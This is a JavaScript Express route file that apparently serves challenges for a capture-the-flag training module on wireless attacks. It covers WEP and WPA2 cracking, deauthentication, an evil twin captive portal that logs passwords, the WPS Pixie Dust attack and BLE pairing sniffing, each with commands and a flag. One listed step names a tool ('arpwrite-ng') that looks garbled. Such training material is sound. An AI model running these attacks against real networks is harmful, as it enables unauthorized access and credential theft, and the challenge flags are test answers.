/**
 * Wireless Security Module
 * Covers: WiFi cracking, WPS attacks, rogue AP, evil twin, jamming
 * Difficulty: Beginner → Pro
 */

const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  res.render('wireless/index', {
    title: 'Wireless Security',
    user: req.session?.user,
  });
});

// W1: WEP Cracking (Beginner)
router.get('/wep', (req, res) => {
  res.json({
    vuln: 'W1: WEP Key Cracking',
    level: 'Beginner',
    description:
      'WEP uses a weak RC4 IV (24-bit). Capture enough IVs to recover the key with PTW attack.',
    steps: [
      'airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wep cap wlan0mon',
      'aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan0mon',
      'arpwrite-ng to generate IVs faster',
      'aircrack-ng -a 1 -b AA:BB:CC:DD:EE:FF wep.cap  # recover key',
    ],
    hint: 'Need ~40K IVs for PTW attack (vs 500K-1M for FMS/KoreK).',
    flag: 'FLAG{wifi01_wep_k1l2}',
  });
});

// W2: WPA2 Handshake Capture (Beginner)
router.get('/wpa2-handshake', (req, res) => {
  res.json({
    vuln: 'W2: WPA2 Handshake Capture & Offline Crack',
    level: 'Beginner',
    description: 'Capture the 4-way handshake then dictionary-attack the PSK offline.',
    steps: [
      'airodump-ng -c 6 --bssid 22:33:44:55:66:77 -w psk wlan0mon',
      'aireplay-ng --deauth 5 -a 22:33:44:55:66:77 wlan0mon  # force handshake',
      'hashcat -m 22000 psk.hc22000 /usr/share/wordlists/rockyou.txt',
    ],
    hint: 'PMKID attack (hcxtools) skips deauth entirely if AP supports it.',
    flag: 'FLAG{wifi02_wpa2_m3n4}',
  });
});

// W3: Evil Twin Attack (Intermediate)
router.get('/evil-twin', (req, res) => {
  res.json({
    vuln: 'W3: Evil Twin — Rogue Access Point',
    level: 'Intermediate',
    description: 'Deploy a malicious AP with the same SSID to capture credentials.',
    attack: [
      'Setup hostapd with matching SSID',
      'Configure dnsmasq to redirect all DNS to local captive portal',
      'Use nginx with PHP to log WiFi password submissions',
      'Deauth clients from legitimate AP to force connection',
    ],
    hint: 'Use airgeddon or wifiphisher for automated evil twin + captive portal.',
    flag: 'FLAG{wifi03_eviltwin_o5p6}',
  });
});

// W4: WPS PIN Attack (Advanced)
router.get('/wps', (req, res) => {
  res.json({
    vuln: 'W4: WPS Pixie Dust Attack',
    level: 'Advanced',
    description:
      'Reaver with Pixie Dust exploits E-S1/E-S2 nonce reuse for offline WPS PIN recovery.',
    command: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1',
    hint: 'Only works on certain chipsets (Broadcom, Realtek). One second to minutes.',
    flag: 'FLAG{wifi04_wps_q7r8}',
  });
});

// W5: Bluetooth LE Sniffing (Pro)
router.get('/ble-sniff', (req, res) => {
  res.json({
    vuln: 'W5: BLE Sniffing — Pairing Capture',
    level: 'Pro',
    description:
      'Use Ubertooth One or HCI snooping to capture BLE pairing exchange, then crack Temp Key if Legacy Pairing.',
    indicators: [
      'Legacy Pairing (TK = 6-digit PIN) → crackable with crackle',
      'Secure Connections (LE SC) → ECC DHKey, not crackable offline',
      'Encrypted traffic only if you captured the full exchange',
    ],
    hint: 'crackle -i data.pcap — only works on Legacy Pairing with captured TK.',
    flag: 'FLAG{wifi05_ble_s9t0}',
  });
});

module.exports = router;
